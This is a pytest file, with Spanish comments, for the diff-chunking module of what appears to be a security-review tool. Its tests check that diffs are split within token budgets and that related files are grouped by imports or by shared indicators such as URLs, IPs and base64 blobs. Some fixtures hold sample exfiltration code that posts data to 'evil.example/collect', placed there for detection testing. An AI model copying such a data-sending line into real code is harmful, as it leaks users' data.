"""Tests de watchgate/core/layers/_semantic/chunking.py."""

from __future__ import annotations

from watchgate.core.layers._semantic import chunking
from watchgate.core.models import FileChange, FileStatus


def _count_tokens(text: str) -> int:
    return len(text.split())


def _file(path: str, diff_hunk: str, status: FileStatus = FileStatus.MODIFIED) -> FileChange:
    return FileChange(
        path=path,
        status=status,
        diff_hunk=diff_hunk,
        additions=diff_hunk.count("\n") + 1,
        deletions=0,
        language="python" if path.endswith(".py") else None,
    )


def test_build_pieces_one_piece_per_small_file():
    files = [_file("a.py", "+x = 1"), _file("b.py", "+y = 2")]
    pieces = chunking.build_pieces(files, _count_tokens, max_diff_tokens=1000)
    assert len(pieces) == 2
    assert {p.source_path for p in pieces} == {"a.py", "b.py"}
    assert all(p.part_label is None for p in pieces)


def test_build_pieces_splits_a_single_oversized_file():
    huge_body = "\n".join(f"+línea {i} de relleno sin nada especial" for i in range(200))
    files = [_file("vendor/big.py", huge_body, status=FileStatus.ADDED)]
    pieces = chunking.build_pieces(files, _count_tokens, max_diff_tokens=50)
    assert len(pieces) > 1
    assert all(p.source_path == "vendor/big.py" for p in pieces)
    assert all(p.part_label is not None for p in pieces)
    # `_overlap_split` trocea por caracteres (ratio fijo ~4 char/token, no el
    # mismo `_count_tokens` de este test) -- el invariante real es que cada
    # fragmento es sensiblemente más pequeño que el fichero completo, no un
    # tope exacto en la misma unidad que usa este test.
    whole_cost = _count_tokens(huge_body)
    assert all(p.token_cost < whole_cost for p in pieces)


def test_pack_pieces_respects_token_budget_per_chunk():
    pieces = [
        chunking.Piece(source_path=f"f{i}.py", content=f"contenido {i} " * 5, token_cost=10)
        for i in range(5)
    ]
    chunks, overflow = chunking.pack_pieces(pieces, reference_graph={}, max_diff_tokens=25)
    assert not overflow
    assert all(c.token_total <= 25 for c in chunks)
    # 5 piezas de coste 10 con presupuesto 25 -> ninguna cabe de 3 en 3, caben de 2 en 2
    assert sum(len(c.pieces) for c in chunks) == 5


def test_pack_pieces_groups_referenced_files_together_when_it_fits():
    pieces = [
        chunking.Piece(source_path="a.py", content="a", token_cost=5),
        chunking.Piece(source_path="b.py", content="b", token_cost=5),
        chunking.Piece(source_path="c.py", content="c", token_cost=5),
    ]
    # a.py referencia a b.py; c.py no referencia a nadie.
    graph = {"a.py": {"b.py"}, "b.py": {"a.py"}, "c.py": set()}
    chunks, overflow = chunking.pack_pieces(pieces, graph, max_diff_tokens=1000)
    assert not overflow
    a_chunk = next(c for c in chunks if "a.py" in c.source_paths)
    assert "b.py" in a_chunk.source_paths


def test_pack_pieces_overflows_past_max_chunks():
    pieces = [
        chunking.Piece(source_path=f"f{i}.py", content=f"c{i}", token_cost=100) for i in range(3)
    ]
    # presupuesto tan pequeño que cada pieza necesita su propio chunk, y el
    # tope de chunks es 1 -> las piezas 2 y 3 no encuentran sitio.
    chunks, overflow = chunking.pack_pieces(pieces, {}, max_diff_tokens=100, max_chunks=1)
    assert len(chunks) == 1
    assert len(overflow) == 2


def test_build_reference_graph_detects_python_import_of_sibling_file():
    files = [
        _file("main.py", "+from helper import do_thing", status=FileStatus.MODIFIED),
        _file("helper.py", "+def do_thing():\n+    pass", status=FileStatus.MODIFIED),
    ]
    graph = chunking.build_reference_graph(files)
    assert "helper.py" in graph["main.py"]
    assert "main.py" in graph["helper.py"]


def test_build_reference_graph_no_edge_when_no_import_detected():
    files = [_file("a.py", "+x = 1"), _file("b.py", "+y = 2")]
    graph = chunking.build_reference_graph(files)
    assert graph["a.py"] == set()
    assert graph["b.py"] == set()


# --- Correlación por literales notables compartidos (IOCs) ----------------


def test_extract_notable_literals_finds_url_ip_and_base64():
    text = (
        "endpoint = 'https://evil.example/collect'\n"
        "host = '185.220.101.7'\n"
        "blob = 'QWxhZGRpbjpvcGVuIHNlc2FtZUFsYWRkaW46b3BlbiBzZXNhbWU='\n"
    )
    literals = chunking._extract_notable_literals(text)
    assert "https://evil.example/collect" in literals
    assert "185.220.101.7" in literals
    assert any(lit.startswith("QWxhZGRpbjpvcGVuIHNlc2FtZUFsYWRkaW4") for lit in literals)


def test_extract_notable_literals_ignores_ordinary_text():
    text = "def foo():\n    return 'hello world'\n"
    assert chunking._extract_notable_literals(text) == set()


def test_build_symbol_reference_graph_connects_files_sharing_a_url():
    files = [
        _file("a.py", "+endpoint = 'https://evil.example/collect'"),
        _file("b.py", "+import requests\n+requests.post('https://evil.example/collect', data)"),
    ]
    graph = chunking.build_symbol_reference_graph(files)
    assert "b.py" in graph["a.py"]
    assert "a.py" in graph["b.py"]


def test_build_symbol_reference_graph_does_not_connect_unrelated_read_and_write():
    """Caso explícito que motivó descartar embeddings: leer y escribir un
    fichero comparten vocabulario (saldrían "parecidos" por similitud de
    texto) pero no comparten ningún literal notable -- no deben conectarse."""
    files = [
        _file("read_config.py", "+with open('config.json') as f:\n+    data = f.read()"),
        _file("write_log.py", "+with open('app.log', 'w') as f:\n+    f.write('started')"),
    ]
    graph = chunking.build_symbol_reference_graph(files)
    assert graph["read_config.py"] == set()
    assert graph["write_log.py"] == set()


def test_merge_reference_graphs_unions_edges_without_duplicating():
    graph_a = {"a.py": {"b.py"}, "b.py": {"a.py"}, "c.py": set()}
    graph_b = {"a.py": {"c.py"}, "c.py": {"a.py"}, "b.py": set()}
    merged = chunking.merge_reference_graphs(graph_a, graph_b)
    assert merged["a.py"] == {"b.py", "c.py"}
    assert merged["b.py"] == {"a.py"}
    assert merged["c.py"] == {"a.py"}


def test_pack_pieces_groups_files_connected_only_by_shared_symbol():
    pieces = [
        chunking.Piece(source_path="a.py", content="a", token_cost=5),
        chunking.Piece(source_path="b.py", content="b", token_cost=5),
    ]
    files = [
        _file("a.py", "+endpoint = 'https://evil.example/collect'"),
        _file("b.py", "+requests.post('https://evil.example/collect', data)"),
    ]
    graph = chunking.merge_reference_graphs(
        chunking.build_reference_graph(files),
        chunking.build_symbol_reference_graph(files),
    )
    chunks, overflow = chunking.pack_pieces(pieces, graph, max_diff_tokens=1000)
    assert not overflow
    a_chunk = next(c for c in chunks if "a.py" in c.source_paths)
    assert "b.py" in a_chunk.source_paths
